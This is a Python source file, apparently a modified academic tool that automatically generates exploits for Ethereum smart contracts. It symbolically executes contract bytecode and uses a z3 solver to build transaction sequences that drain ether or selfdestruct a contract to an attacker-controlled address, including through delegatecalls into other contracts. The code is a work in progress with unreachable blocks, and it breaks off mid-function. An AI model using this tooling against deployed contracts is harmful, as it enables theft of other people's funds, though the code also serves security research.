#!/usr/bin/env python2.7
import itertools
import logging
import resource
import sys
from binascii import unhexlify, hexlify, a2b_hex
import json

from collections import defaultdict
from z3 import z3

from ethanalyze.constraints import model_to_calls, check_model_and_resolve
from ethanalyze.evm import concrete, CombinedSymbolicResult
from ethanalyze.project import Project

#R
from copy import copy
from ethanalyze.rpc_queries import getByteCode, checkBalance, sendExploit
from ethanalyze.evm import SymbolicStorage, SymbolicEVMState, IntractablePath



# logging.basicConfig(level=logging.ERROR)
logging.basicConfig(level=logging.INFO)
# logging.basicConfig(level=logging.DEBUG)


class Nope(Exception):
    pass

# r is combined
# combined = CombinedSymbolicResult() <- the initial storage included?
# combined.prepend(call_r)
# combined._combine(initial_storage, initial_balance)
# combined.simplify()
def attempt_exploit_call(r, target_addr, target_amount, amount_check='+', initial_balance=None, controlled_addrs=set()):
    # TODO same fix as in suicide and DC!
    addr = r.state.stack[-2]
    if not concrete(addr):
        addr = z3.simplify(addr)

    amount = r.state.stack[-3]
    if not concrete(amount):
        amount = z3.simplify(amount)

    extra_constraints = []
    #????
    if not concrete(addr):
        extra_constraints.append(z3.Extract(159, 0, addr) == target_addr)
    else:
        if addr != target_addr:
            raise Nope

    if not concrete(amount):
        if amount_check == '+':
            extra_constraints.append(z3.UGE(amount, target_amount))
        elif amount_check == '-':
            extra_constraints.append(z3.UGT(amount, 0))
            extra_constraints.append(z3.ULE(amount, target_amount))
        else:
            extra_constraints.append(amount == target_amount)
        final_balance = r.state.balance
        extra_constraints.append(z3.ULE(amount, final_balance))

    # ensure we're not spending more for this exploit than we gain
    total_spent = None
    for res in r.results:
        callvalue = z3.BitVec('CALLVALUE_%d' % res.xid, 256)
        extra_constraints.append(z3.ULE(callvalue, 10 * (10 ** 18)))  # keep it semi-reasonable: at most 10 Eth per call
        if total_spent is None:
            total_spent = callvalue
        else:
            total_spent += callvalue

    extra_constraints.append(z3.ULT(total_spent, amount))

    # also, ensure the contract does not require a unreasonable start-balance (>100 Eth)
    if not initial_balance:
        start_balance = z3.BitVec('BALANCE_%d' % r.results[0].xid, 256)
        extra_constraints.append(z3.ULE(start_balance, 100 * (10 ** 18)))

    # addresses under our control
    # assume we also control the target address
    controlled_addrs.add(target_addr)
    return attempt_exploit(r, extra_constraints, controlled_addrs)


def attempt_exploit_callcode(r, target_addr, controlled_addrs=set()):
    #TODO same fix as in suicide and DC!
    addr = z3.simplify(r.state.stack[-2])

    extra_constraints = []

    if not concrete(addr):
        extra_constraints.append(z3.Extract(159, 0, addr) == target_addr)
    else:
        if addr != target_addr:
            raise Nope

    # addresses under our control
    # assume we also control the target address
    controlled_addrs.add(target_addr)
    return attempt_exploit(r, extra_constraints, controlled_addrs)


def attempt_exploit_delegatecall(r, target_addr, controlled_addrs=set()):
    #?get addr from second from end stack element (stack pos before DC exec)
    called_addr = r.state.stack[-2]
    extra_constraints = []

    # R: concrete addr is a match!
    if (called_addr == target_addr):
        # addresses under our control
        # assume we also control the target address
        controlled_addrs.add(target_addr)
        return attempt_exploit(r, extra_constraints, controlled_addrs)

    addr = z3.simplify(r.state.stack[-2])
    extra_constraints = []

    if not concrete(addr):
        #if addr not concrete, then we have to think of it as symbolic-SLOAD
        extra_constraints.append(z3.Extract(159, 0, addr) == target_addr)
    else:
        #if its concrete and not specififly the at addr, then there's no way to abuse it as a
        if addr != target_addr:
            raise Nope

    # addresses under our control
    # assume we also control the target address
    controlled_addrs.add(target_addr)
    return attempt_exploit(r, extra_constraints, controlled_addrs)


def attempt_exploit_suicide(c_r, target_addr, controlled_addrs=set()):
    # #get top of stack and simplify it
    # addr = z3.simplify(c_r.state.stack[-1])
    #
    # extra_constraints = []
    #
    # if not concrete(addr):# if the element is not concrete - add it as a constraint
    #     extra_constraints.append(z3.Extract(159, 0, addr) == target_addr)
    # else:# if its a conceret addr - we can work with it directly
    #     if addr != target_addr: #if it's NOT the Attacker controlled addr; then there's nothing we can do - this is not an exploitable execution
    #         raise Nope
    #
    # # addresses under our control
    # # assume we also control the target address
    # controlled_addrs.add(target_addr)
    # return attempt_exploit(c_r, extra_constraints, controlled_addrs)
    #

    #Roman's alteration for concrete addr in calls
    # -> z3.simplify(c_r.state.stack[-1]); this would give Z3 error on concrete addr that's on stack
    called_addr = c_r.state.stack[-1] #get top of stack

    extra_constraints = []

    #check if the last element on the stack is the Attacker's addr;
    #this was used in the old application as a sanity check!!
    if concrete(called_addr) and isinstance(called_addr, long): #if it's a concrete and long- this is a concrete address on stack
        if (called_addr != target_addr): #sanitycheck
            raise Nope #nothing we can do; exec not epxloitable
    else: #not concrete? -> old function
        addr = z3.simplify(called_addr)
        if (str(z3.simplify(called_addr)) == '0'):#sanity check; if the top of stack addr is a zero; mening its not At. controlled; then no point in trying an execution
            logging.info('------ABORT; z3.simplify(called_addr) => %s ------\n', addr)
            raise Nope
        if not concrete(addr):
            extra_constraints.append(z3.Extract(159, 0, addr) == target_addr)
            pass
        else:  # if its a conceret addr AND NOT the At. controlled; then there's nothing we can do
            if addr != target_addr:
                raise Nope

    # addresses under our control
    # assume we also control the target address
    controlled_addrs.add(target_addr)
    return attempt_exploit(c_r, extra_constraints, controlled_addrs)

#does the entire constraint resolution and exploit code generation.
def attempt_exploit(c_r, extra_constraints, controlled_addrs=set()):
    # extra_constraints = []
    for res in c_r.results:
        expr = None
        for controlled_addr in controlled_addrs:
            new_caller = z3.Extract(159, 0, z3.BitVec('CALLER_%d' % res.xid, 256)) == controlled_addr
            if expr is None:
                expr = new_caller
            else:
                expr = z3.Or(expr, new_caller)
        extra_constraints.append(expr)

    #check_model_and_resolve also doesnt care if it's same call, no c_r.results
    try:
        '''#logging.debug('combined path constraints:')
        for i, c in enumerate(r.constraints + extra_constraints):
            #logging.debug('C%d: %s', i, simplify_non_const_hashes(c, r.sha_constraints.keys()))
        for i, (h, v) in enumerate(r.sha_constraints.iteritems()):
            #logging.debug('Hash %d: %s = KECCAK(%s)', i, h, v)'''
        # for addr in extra_constraints:
        #         logging.info("extra_constraints: %s" % addr)
        model = check_model_and_resolve(c_r.constraints + extra_constraints, c_r.sha_constraints)
        # model = check_model_and_resolve(c_r.constraints, c_r.sha_constraints)

        # enforce we control all CALLER-addresses
        # if any(model[v].as_long() not in controlled_addrs for v in model if v.name().startswith('CALLER')):
        #R: rewrite for debugging
        for v in model:
            if v.name().startswith('CALLER') and (model[v].as_long() not in controlled_addrs):
                logging.info("There's a %s in model that doesn't correspond to a controlled_addr; %s " % (v.name(), hex(model[v].as_long()) ) )
                raise Nope

        return model_to_calls(model, c_r.idx_dict), c_r, model
    except IntractablePath as e:
        # logging.exception('Intractable Path/Constraints')
        raise Nope

def combined_exploit(p, flags, target_addr, target_amount, amount_check='+', initial_storage=dict(), initial_balance=None,
                     max_calls=3):
    #debug address_find_prepend
    # storage_result = address_find_prepend_r('1', p, initial_storage, initial_balance,
    #                                         target_addr)  # input is the STORAGE index of the addr
    #
    ####@@@@**** Z1.1 get CC on callee/CALLER ******
    all_vuln = []
    all_suicide_vuln = []
    #TODO overwrite to avoid fighting over DELGEATECALL and debug faster
    for op_code in {'SUICIDE'}: #for op_code in flags:
        #check callee for CC
        all_op_code_callee = []
        ret_val = partial_head_callee(all_op_code_callee, p, op_code, initial_storage, initial_balance, target_addr)
        if (ret_val != None):
                return ret_val
        all_suicide_vuln.extend(all_op_code_callee)
        # logging.warn("main:A1: finished PARTial_head_callee()")

        # check CALLER for CC
        all_op_code_CALLER = []
        ret_val = full_head_callee_tail(all_op_code_CALLER, p, op_code, initial_storage, initial_balance, target_addr)
        # if (ret_val != None):  # dumb check if we found a direct exploit on CC
        if (ret_val != None):
                return ret_val
        all_suicide_vuln.extend(all_op_code_CALLER)
        # logging.warn("main:A2: finished FULL_head_callee_tail()")
        # return ret_val if (ret_val != None) else all_vuln.extend(all_op_code_CALLER)
    all_vuln.extend(all_suicide_vuln)

    if not all_vuln:
        logging.warn("  No vulnerable SUICIDE found, aborting (remember to add CALL, CALLCODE or DELEGATECALL later!) ")
        return
    logging.info("COMB: %s non-directly vulnerable SUICIDE paths found, lets try to look for state-changing paths (remember to add CALL, CALLCODE or DELEGATECALL later!)", len(all_vuln))
    logging.info(
        "<<>><<>><<>><<>><<>><<>><<>>END OF VULN PHASE^<<>><<>><<>><<>><<>><<>><<>>")
    ####@@@@**** STATECHANGINGPATH FUSION ******

    all_ends = [] #=> all_state_changes

    all_callee_schange = []
    ret_val = partial_head_callee(all_callee_schange, p, 'SSTORE', initial_storage, initial_balance, target_addr)
    all_ends.extend(all_callee_schange)

    all_CALLER_schange =[]
    ret_val = full_head_callee_tail(all_CALLER_schange, p, 'SSTORE', initial_storage, initial_balance, target_addr)
    all_ends.extend(all_CALLER_schange)

    if not all_vuln:
        logging.warn("COMB: No SSTORE paths found, aborting")
        return
    logging.info(
        "COMB: %s SSTORE ops found, now lets try to prepend it to a CC path (remember to add CALL, CALLCODE or DELEGATECALL later!)",
        len(all_vuln))
    logging.info(
        "<<>><<>><<>><<>><<>><<>><<>>END OF SSTORE PHASE^<<>><<>><<>><<>><<>><<>><<>>")
    ####@@@@**** Z1.2 try to prepend 1 SSTORE ******
    vuln_may_end_compatible = defaultdict(lambda: [[]])  # used later in second statechange stage
    for state_i, state_r in enumerate(all_ends):
    # for state_i, state_r in enumerate(all_callee_schange):
        # writes = set(end_r.state.storage.writes) #not used?
        for vuln_i, vuln_r in enumerate(all_vuln):
            if not vuln_r.may_read_from(state_r):
                continue

            vuln_may_end_compatible[vuln_i][0].append(state_i)
            combined = CombinedSymbolicResult()
            combined.prepend(vuln_r)
            combined.prepend(state_r)
            combined._combine(initial_storage, initial_balance)
            #somehow bring the calleeCALLDATA to merge with CALLDATA constraints
            combined.simplify()
            try:  # try to see if one statechaning + 1 critical is enough for an exploit
                # if vuln_r in e_all_calls:
                #     return attempt_exploit_call(combined, target_addr, target_amount, amount_check, initial_balance)
                # elif vuln_r in e_all_callcodes:
                #     return attempt_exploit_callcode(combined, target_addr)
                # elif vuln_r in e_all_delegatecalls:
                #     return attempt_exploit_delegatecall(combined, target_addr)
                if vuln_r in all_suicide_vuln:
                    return attempt_exploit_suicide(combined, target_addr)
            except Nope:
                continue
    logging.info(
                "<<>><<>><<>><<>><<>><<>><<>>END OF 1+1 PHASE^<<>><<>><<>><<>><<>><<>><<>>")
    ####@@@@**** Z1.3 try to prepend 2+ SSTORE ******
    logging.info("COMB: that didn't work; lets try to prepend MORE then one state-changing path")
    end_may_end_compatible = defaultdict(list)  ## product('ABCD', 'xy') --> Ax Ay Bx By Cx Cy Dx Dy
    # populate the storage_compatible dict with may_read_from results for all possible combinations of all_ends
    for (i, a_r), (j, b_r) in itertools.product(enumerate(all_ends), enumerate(all_ends)):  # diff combinations of ends
        if a_r.may_read_from(b_r):
            end_may_end_compatible[i].append(j)
    # [] and {} vs list() and dict() speed?
    calls = [all_ends]
    while len(calls) < max_calls - 1:
        # create copy of all_ends
        new_ends = [r.copy() for r in all_ends]
        calls.append(new_ends)
        # from above loops;
        # compatible is a dict of may_read_from combinations of x from all_vuln and r_end
        for k, v in vuln_may_end_compatible.iteritems():
            new_compatible = set()
            for c in v[-1]:
                new_compatible.update(end_may_end_compatible[c])
            v.append(sorted(new_compatible))

        # R: useless code; used to show vuln_may_end_compatible is altered in the above loop for later use below
        new_v_m_e_compatible = vuln_may_end_compatible

        for i, vuln_r in enumerate(all_vuln):
            for combo_ids in itertools.product(*new_v_m_e_compatible[i]):
                # zip example:
                ##  numberList = [1, 2, 3]
                ##  strList = ['one', 'two', 'three']
                ##  result = zip(numberList, strList)
                ##  {(2, 'two'), (3, 'three'), (1, 'one')}
                combo = [vuln_r] + [c[j] for c, j in zip(calls, combo_ids)]
                combined = CombinedSymbolicResult()
                # logging.debug('Combo: %s', ', '.join('%x' % r.state.pc for r in combo[::-1]))
                for r in combo:
                    combined.prepend(r)
                combined._combine(initial_storage, initial_balance)
                combined.simplify()
                try:
                    # if vuln_r in all_calls:
                    #     return attempt_exploit_call(combined, target_addr, target_amount, amount_check, initial_balance)
                    # elif vuln_r in all_callcodes:
                    #     return attempt_exploit_callcode(combined, target_addr)
                    # elif vuln_r in all_delegatecalls:
                    #     return attempt_exploit_delegatecall(combined, target_addr)
                    if vuln_r in all_suicide_vuln:
                        return attempt_exploit_suicide(combined, target_addr)
                except Nope:
                    continue

    logging.info('Could not exploit any CC path even with %s state-changing paths prepended' % str(max_calls-1))
    return

    ##################################################################################
    #OLD combined_exploit
    ##################################################################################

    #find SLOAD BBs in already existing BBs
    sload_bbs = {ins.bb.start for ins in p.cfg.filter_ins('SLOAD')}

    # 4.3 Path Generation
    #each "IF" identifies a "critical path" ending in CALL/CALLCODE/DELEGATECALL/SELFDESTRUCT
    all_calls = []
    if 'CALL' in flags:
        #find CALL instructios which are descendants of th root BB
        call_ins = p.cfg.filter_ins('CALL')
        if not call_ins:
            logging.info('No CALL instructions')
        logging.info('Found %d CALL instructions', len(call_ins))
        #get_constraints returns; yield call=ins, call_path=path, call_r=self.run_symbolic(path, inclusive)
        # 4.4.4 constraint results - combined
        # `get_constraints` does all the magic of enumerating paths through a CFG as well as symbolic execution of a path
        # (this is something that you will have to modify to adapt for inner calls).
        for call, call_path, call_r in p.get_constraints(call_ins, [1]): #going to SymbExec
            logging.info("Call: %s", call)
            logging.info("Path: %s", '->'.join('%x' % p for p in call_path))
            if set(call_path) & sload_bbs:
                # if there is a SLOAD on this path,
                # it might benefit from prepending a SSTORE later on?
                all_calls.append(call_r)
            #init CSR object
            combined = CombinedSymbolicResult()
            combined.prepend(call_r)
            combined._combine(initial_storage, initial_balance)
            combined.simplify()
            # Everytime a path is found, an exploit attempt is started using the respective `attempt_exploit_*` function.
            # attempt_exploit_call does the entire constraint resolution and exploit code generation.
            try:
                return attempt_exploit_call(combined, target_addr, target_amount, amount_check, initial_balance)
            except Nope:
                continue
        logging.info('All calls: %s', all_calls)

    all_callcodes = []
    if 'CALLCODE' in flags:
        callcode_ins = p.cfg.filter_ins('CALLCODE')
        if not callcode_ins:
            logging.info('No CALLCODE instructions')
        logging.info('Found %d CALLCODE instructions', len(callcode_ins))
        for callcode, callcode_path, callcode_r in p.get_constraints(callcode_ins, [1]):
            logging.info("Callcode: %s", callcode)
            logging.info("Path: %s", '->'.join('%x' % p for p in callcode_path))
            if set(callcode_path) & sload_bbs:
                # if there is a SLOAD on this path,
                # it might benefit from prepending a SSTORE later on
                all_callcodes.append(callcode_r)
            combined = CombinedSymbolicResult()
            combined.prepend(callcode_r)
            combined._combine(initial_storage, initial_balance)
            combined.simplify()
            try:
                return attempt_exploit_callcode(combined, target_addr)
            except Nope:
                continue
        logging.info('All callcodes: %s', all_callcodes)

    all_delegatecalls = []
    if 'DELEGATECALL' in flags:
        delegatecall_ins = p.cfg.filter_ins('DELEGATECALL')
        if not delegatecall_ins:
            logging.info('No DELEGATECALL instructions')
        logging.info('Found %d DELEGATECALL instructions', len(delegatecall_ins))
        #get_const returns: ins, path, self.run_symbolic(path, inclusive)
        for delegatecall, delegatecall_path, delegatecall_r in p.get_constraints(delegatecall_ins, [1]):
            logging.info("Delegatecall: %s", delegatecall)
            logging.info("Path: %s", '->'.join('%x' % p for p in delegatecall_path))
            if set(delegatecall_path) & sload_bbs:
                # if there is a SLOAD on this path,
                # it might benefit from prepending a SSTORE later on
                all_delegatecalls.append(delegatecall_r)
            combined = CombinedSymbolicResult()
            combined.prepend(delegatecall_r)
            combined._combine(initial_storage, initial_balance)
            combined.simplify()
            try:
                return attempt_exploit_delegatecall(combined, target_addr)
            except Nope:
                continue
        logging.info('All delegatecalls: %s', all_delegatecalls)

    all_suicides = []
    if 'SUICIDE' in flags:
        suicide_ins = p.cfg.filter_ins('SUICIDE')
        if not suicide_ins:
            logging.info('No SUICIDE instructions')
        logging.info('Found %d SUICIDE instructions', len(suicide_ins))
        for suicide, suicide_path, suicide_r in p.get_constraints(suicide_ins, [0]):
            logging.info("Suicide: %s", suicide)
            logging.info("Path: %s", '->'.join('%x' % p for p in suicide_path))
            if set(suicide_path) & sload_bbs:
                # if there is a SLOAD on this path,
                # it might benefit from prepending a SSTORE later on
                all_suicides.append(suicide_r)
            combined = CombinedSymbolicResult()
            combined.prepend(suicide_r)
            combined._combine(initial_storage, initial_balance)
            combined.simplify()
            try:
                return attempt_exploit_suicide(combined, target_addr)
            except Nope:
                continue
        logging.info('All suicides: %s', all_suicides)
    # END OF 4 critical ops BLOCKs

    all_vuln = all_calls + all_callcodes + all_delegatecalls + all_suicides

    if not all_vuln:
        logging.warn("No vulnerable CALL, CALLCODE, DELEGATECALL, or SUICIDE found, aborting")
        return

    # look for terminating paths that have a SSTORR in them, then combine one critical_r and such apath
    end_ins = p.cfg.filter_ins('RETURN') + p.cfg.filter_ins('STOP')
    if not end_ins:
        logging.info('No RETURN or STOP instructions')
        return
    logging.info('Found %d RETURN and STOP instructions', len(end_ins))
    vuln_may_end_compatible = defaultdict(lambda: [[]]) # list of lists
    all_ends = []
    for i, (end, end_path, end_r) in enumerate(p.get_constraints(end_ins, find_sstore=True)): #find_sstore=True
        logging.info("End: %s", end)
        logging.info("Path: %s", '->'.join('%x' % p for p in end_path))
        all_ends.append(end_r)
        writes = set(end_r.state.storage.writes)
        for j, vuln_r in enumerate(all_vuln):
            if not vuln_r.may_read_from(end_r):
                continue
            vuln_may_end_compatible[j][0].append(i)
            combined = CombinedSymbolicResult()
            combined.prepend(vuln_r) #vuln_r comes from one of the 4 critical SymR
            combined.prepend(end_r) #end_r is a state-changing SymbR
            combined._combine(initial_storage, initial_balance)
            combined.simplify()
            try: #maybe a simple combine will suffice; 1 StateChange + 1 Critical path?
                if vuln_r in all_calls:
                    return attempt_exploit_call(combined, target_addr, target_amount, amount_check, initial_balance)
                elif vuln_r in all_callcodes:
                    return attempt_exploit_callcode(combined, target_addr)
                elif vuln_r in all_delegatecalls:
                    return attempt_exploit_delegatecall(combined, target_addr)
                elif vuln_r in all_suicides:
                    return attempt_exploit_suicide(combined, target_addr)
            except Nope:
                continue

    logging.info('All ends: %s', all_ends)

    # if the above; 1 StateChange + 1 Critical path doesnt work; try to combine them by stitching paths below
    #path stitching for the critical+statechanging paths > then 2 calls

    end_may_end_compatible = defaultdict(list) ## product('ABCD', 'xy') --> Ax Ay Bx By Cx Cy Dx Dy
    # populate the storage_compatible dict with may_read_from results for all possible combinations of all_ends
    for (i, a_r), (j, b_r) in itertools.product( enumerate(all_ends), enumerate(all_ends) ): #diff combinations of ends
        if a_r.may_read_from(b_r):
            end_may_end_compatible[i].append(j)
    #[] and {} vs list() and dict() speed?
    calls = [all_ends]
    while len(calls) < max_calls-1:
        #create copy of all_ends
        new_ends = [r.copy() for r in all_ends]
        calls.append(new_ends)
        # from above loops;
        #compatible is a dict of may_read_from combinations of x from all_vuln and r_end
        for k, v in vuln_may_end_compatible.iteritems():
            new_compatible = set()
            for c in v[-1]:
                new_compatible.update(end_may_end_compatible[c])
            v.append(sorted(new_compatible))

        #R: useless code; used to show vuln_may_end_compatible is altered in the above loop for later use below
        new_v_m_e_compatible = vuln_may_end_compatible

        for i, vuln_r in enumerate(all_vuln):
            for combo_ids in itertools.product(*new_v_m_e_compatible[i]):
                #zip example:
                ##  numberList = [1, 2, 3]
                ##  strList = ['one', 'two', 'three']
                ##  result = zip(numberList, strList)
                ##  {(2, 'two'), (3, 'three'), (1, 'one')}
                combo = [vuln_r] + [c[j] for c,j in zip(calls, combo_ids)]
                combined = CombinedSymbolicResult()
                # logging.debug('Combo: %s', ', '.join('%x' % r.state.pc for r in combo[::-1]))
                for r in combo:
                    combined.prepend(r)
                combined._combine(initial_storage, initial_balance)
                combined.simplify()
                try:
                    if vuln_r in all_calls:
                        return attempt_exploit_call(combined, target_addr, target_amount, amount_check, initial_balance)
                    elif vuln_r in all_callcodes:
                        return attempt_exploit_callcode(combined, target_addr)
                    elif vuln_r in all_delegatecalls:
                        return attempt_exploit_delegatecall(combined, target_addr)
                    elif vuln_r in all_suicides:
                        return attempt_exploit_suicide(combined, target_addr)
                except Nope:
                    continue

    logging.info('Could not exploit any RETURN+CALL')
    return

def address_find_prepend_r(storage_index, p, initial_storage, initial_balance, target_addr):
    logging.info('------ begin ADDR on %s ------')
    CALLER_ins = p.cfg.filter_ins('RETURN') + p.cfg.filter_ins('STOP')
    find_sstore_flag = True
    if not CALLER_ins:
        logging.warn('ADDR: No SSTORE instructions found on CALLER, abort ADDR')
        return
    logging.info('ADDR: Found %d SSTORE instructions on CALLER', len(CALLER_ins))

    for addrcall, addr_path, addr_r in p.get_constraints_CLONE(CALLER_ins,
                                                         find_sstore=find_sstore_flag,
                                                               storage_index = storage_index,
                                                               inclusive=True):
        logging.info("addr_r: The %s call that ends the path : %s", 'SSTORE', addrcall)
        logging.info("addr_r: Path: %s", '->'.join('%x' % path for path in addr_path))

        #this should actually be a generator ; beacsue there are multiple results possible!!!
        #BUT; for debugging lets try just the first result
        return addr_r
        # yield addr_r #addr is in the state



def full_head_callee_tail(return_r_list, p, req_op, initial_storage, initial_balance, target_addr):
    logging.info('------ begin FULL on %s ------', req_op)
    reuse = True
    reuse2 = True
    # will be used in attempt_exploit if no callee-tail is found
    # return_r = None
    ####@@@@**** A2.1: find req_op on CALLER ******
    if (req_op == 'SSTORE'):
        CALLER_ins = p.cfg.filter_ins('RETURN') + p.cfg.filter_ins('STOP')
        find_sstore_flag = True
    else: #4xCC
        CALLER_ins = p.cfg.filter_ins(req_op)
        CALLER_sload_bbs = {ins.bb.start for ins in p.cfg.filter_ins('SLOAD')}
        find_sstore_flag = False
    if not CALLER_ins:
        logging.warn('FULL: No %s instructions found on CALLER, abort FULL', 'RETURN/STOP' if req_op == 'SSTORE' else req_op)
        return
    logging.info('FULL: Found %d %s instructions on CALLER', len(CALLER_ins), 'RETURN/STOP' if (req_op == 'SSTORE') else req_op)

    #we're NOT using Inclusive because we actually DONT want to alter stack when CC happens - so return before CC happnes
    for headcall, head_path, head_r in p.get_constraints(CALLER_ins,
                                                         [0], #intresting_slices secondary check -> find_sstore would be checked first
                                                         term_on_DC=True,
                                                         find_sstore=find_sstore_flag):
        logging.info("head_r: The %s call that ends the path : %s", req_op, headcall)
        logging.info("head_r: Path: %s", '->'.join('%x' % path for path in head_path))

        if (not head_r.path_left): #it terminated without a DC
            return_r = head_r

            if (req_op == 'SSTORE'):
                return_r_list.append(return_r)
            else:  # 4xCC
                if (set(head_path) & CALLER_sload_bbs):
                    return_r_list.append(return_r)

                combined = CombinedSymbolicResult()
                combined.prepend(return_r)
                combined._combine(initial_storage, initial_balance)
                combined.simplify()
                try:
                    return attempt_exploit_suicide(combined, target_addr)
                except Nope:
                    continue
        else: #if (head_r.path): #if list is NOT empty -> it encountered a DC
            # we need to save a copy of the leftover path for tail to use later;
            # head_r_leftpath_copy = copy(head_r.path_left)

            ####@@@@**** A2.1: get callee project ******
            # sanity check before get callee's code
            if not concrete(head_r.state.callee_addr):
                logging.warn('????FULL: ABORTTTTTTTTTTTTthe callee addr is a SLOAD Symbolic (%s)???' % str(head_r.state.callee_addr))
                # save for later: new_caller = z3.Extract(159, 0, z3.BitVec('CALLER_%d' % res.xid, 256)) == controlled_addr
                return
                if 'STORAGE' not in str(head_r.state.callee_addr): #sanity
                    # logging.warn('????FULL: the callee addr NOT saved in STORAGE -> %s!!' % str(head_r.state.callee_addr) )
                    return
                #let's try to look for a prepend_sstore_get_addr exec
                storage_index = get_index_from_string(str(head_r.state.callee_addr))
                storage_result = address_find_prepend_r(storage_index, p, initial_storage, initial_balance, target_addr) #input is the STORAGE index of the addr
                if (not storage_result):
                    logging.warn("????FULL: storage_result is None; can't use this to parse addr... ABORT")
                    return
                hex_addr = hex(storage_result.state.callee_addr).rstrip("L")

            else:# logging.info('CALLER:the callee\'s addr is %s ', hex(head_r.state.callee_addr))
                hex_addr = hex(head_r.state.callee_addr).rstrip("L")

            #now get me the proj!
            callee_p = addr_to_project(hex_addr)

            ####@@@@**** A2.2: execute callee ******
            if(req_op != 'SSTORE'): #mening it's a CC for which we check for SLOADs on path
                callee_sload_bbs = {ins.bb.start for ins in p.cfg.filter_ins('SLOAD')}

            callee_terminating_ins = callee_p.cfg.filter_ins('RETURN', reachable=True) \
                                     + callee_p.cfg.filter_ins('STOP', reachable=True)
            # + callee_p.cfg.filter_ins('SUICIDE', reachable=True)
            if not callee_terminating_ins:
                logging.warn('FULL: @#$%@#$% No RETURN/STOP instructions on callee; this is wrong @#$%@#$% !!!!!!!!!')
                return
            logging.info('FULL: Found %d RETURN/STOP/ instructions on callee (without SUICIDE)',len(callee_terminating_ins))

            # will be used in attempt_exploit if no callee-tail is found
            # return_r = head_r
            #make stack copy - used after we get back from tail
            # head_r_stack_copy = []
            # for i in head_r.state.stack:
            #     head_r_stack_copy.append(i)

            # prepare an adjusted state of head
            # use non-reference copy becasue copy() really copies only the storage;
            # TODO copy() is not a clean non-reference duplicate! STACK is still being referenced!!
            adjusted_head_r_state = SymbolicEVMState(xid=head_r.xid, code=callee_p.code)

            if (reuse):
                adjusted_head_r_state.storage = copy(head_r.state.storage)
            else:
                # newState means new Storage
                pass

            adjusted_head_r_state.callee_addr = 1
            adjusted_head_r_state.call_args = head_r.state.call_args

            if (head_r.state.input_value != None):
                adjusted_head_r_state.input_value = head_r.state.input_value
                logging.info("FULL: INPUT_value passed to callee")
                # logging.info("FULL: INPUT_value passed to callee : %s",head_r.state.input_value)
            else:
                logging.warn("FULL: NO input_value passed!!! is this a pass to fallback func?")

            #TODO added inclusive=True so that RETURN op would write to memory for CALLER to collect
            for calleecall, callee_path, callee_r in callee_p.get_constraints_CLONE(callee_terminating_ins,
                                                                              import_state=adjusted_head_r_state,
                                                                              inclusive=True):
                logging.info("callee_r: terminatingcall: %s", calleecall)
                logging.info("callee_r: Path: %s", '->'.join('%x' % path for path in callee_path))

                ####@@@@**** A1.3: execute the rest (TAIL) of CALLER to CC ******
                # create a copy of head's SymbolicResults and adjust it to represent a successful return from call
                adjusted_state_for_tail = copy(head_r.state)
                # need to revert stack to the state before we can callee
                # while (len(adjusted_head_r_state.stack) != 0):
                #     adjusted_head_r_state.stack.pop()
                # for i in head_r_stack_copy:
                #     adjusted_head_r_state.stack.push(i)
                adjusted_state_for_tail.stack = copy(head_r.state.stack)

                adjusted_state_for_tail.pc += 1
                adjusted_state_for_tail.stack.append(1)

                adjusted_state_for_tail.callee_addr = head_r.state.callee_addr
                adjusted_state_for_tail.call_args = head_r.state.call_args

                if (reuse2):
                    adjusted_state_for_tail.storage = copy(callee_r.state.storage)
                else:
                    adjusted_state_for_tail.storage = SymbolicStorage(head_r.xid)


                if (callee_r.state.return_value != None):
                    adjusted_state_for_tail.return_value = callee_r.state.return_value
                    logging.info("FULL: RETURN_value passed to tail")
                    # logging.info("FULL: RETURN_value passed to tail: %s",callee_r.state.return_value)
                else:
                    logging.info("FULL: NO return_value; is this just a return-less path?")

                tail_r = p.run_symbolic(copy(head_r.path_left), state=adjusted_state_for_tail)
                if (not tail_r):
                    logging.info("$$$$$$$$$$$$$$$:tail_r: gave None back - ABORT")
                    return
                logging.info("FULL: tail_r: --- done executing tail on run_symoblic() ---")


                merged = CombinedSymbolicResult()
                merged.prepend(tail_r)
                merged.merge_prepend(callee_r)
                merged.merge_prepend(head_r)
                return_r = merged.merge_results(initial_storage, initial_balance)

                #throwback to WF scheme
                # tail_r.constraints[:0] = callee_r.constraints #works like a prepend-extend
                # tail_r.constraints[:0] = head_r.constraints
                # return_r = tail_r

                # Old extend
                # tail_r.constraints.extend(callee_r.constraints)
                # tail_r.constraints.extend(head_r.constraints)
                # return_r = tail_r

                if (req_op == 'SSTORE'): #
                    return_r_list.append(return_r)
                else: # 4xCC
                    if (set(callee_path) & callee_sload_bbs) or (set(head_path) & CALLER_sload_bbs):  # callee_has_SLOAD meaning callee encountered a SLOAD on it's exec
                        return_r_list.append(return_r)

                    combined = CombinedSymbolicResult()
                    combined.prepend(return_r)
                    combined._combine(initial_storage, initial_balance)
                    combined.simplify()
                    try:
                        return attempt_exploit_suicide(combined, target_addr)
                    except Nope:
                        continue
                # logging.info('-x-x-x- finished a whole callee_tail run -x-x-x-')

    logging.info('FULL: all return results on op %s : %s', req_op, return_r_list)
    # return


def partial_head_callee(return_r_list, p, req_op, initial_storage, initial_balance, target_addr):
    logging.info('------ begin PART on %s ------', req_op )
    reuse = True
    reuse2 = True
    ####@@@@**** B1.1: find valid DC on CALLER ******
    CALLER_sload_bbs = {ins.bb.start for ins in p.cfg.filter_ins('SLOAD')}
    callee_sload_bbs = None #will be init-ed later


    delegatecall_ins = p.cfg.filter_ins('DELEGATECALL')
    if not delegatecall_ins:
        logging.warn('PART: No DELEGATECALL instructions on CALLER, , abort PART')
        return
    logging.info('PART: Found %d DELEGATECALL instructions on CALLER', len(delegatecall_ins))

    # TODO NOTICE that this will return all possible paths; not only INTERESTING ones!
    #use find_terminate to get path that end with a termianting op, that goes THROUGH the requested DC
    for headcall, head_path, head_r in p.get_constraints(delegatecall_ins,
                                                         find_terminate=True,
                                                         term_on_DC=True):
        logging.info("head_r: The DELEGATECALL call that ends the delegate_path : %s", headcall)
        logging.info("head_r: Path: %s", '->'.join('%x' % path for path in head_path))

        #we need to save a copy of the leftover path for tail to use later;
        # head_r_leftpath_copy = copy(head_r.path_left)

        ####@@@@**** B1.2: get callee's project******
        # if ALWYAS TRUE - (head_r.path): #if list NOT empty; -> run on DC will give empty path, it will actually end on DC
        # sanity check before get callee's code
        if not concrete(head_r.state.callee_addr):
            logging.warn(
                'ABORTTTTTTTPART: the callee addr is NOT concrete - SLOAD Symbolic:  %s ', str(head_r.state.callee_addr))
            return
            if 'STORAGE' not in str(head_r.state.callee_addr):  # sanity
